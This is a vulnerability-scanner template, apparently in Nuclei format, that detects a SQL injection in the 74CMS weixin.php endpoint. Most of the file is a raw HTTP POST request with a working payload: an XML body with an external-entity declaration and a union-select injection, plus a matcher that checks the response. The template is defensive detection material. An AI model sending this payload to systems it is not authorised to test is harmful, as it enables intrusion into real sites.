id: 74cms-sql-injection
info:
  name: 74CMS SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects SQL injection vulnerability in the 74CMS platform via the weixin.php endpoint.
  reference:
    - http://cn-sec.com/archives/25900.html
variables:
  rand: "{{rand_int(200000000, 210000000)}}"
http:
  - raw:
      - |
        POST /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///"]>
        <xml>
          <ToUserName>&test;</ToUserName>
          <FromUserName>1111</FromUserName>
          <MsgType>123</MsgType>
          <FuncFlag>3</FuncFlag>
          <Content>1%' union select md5({{rand}})#</Content>
        </xml>
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "{{md5(rand)}}"
        part: body
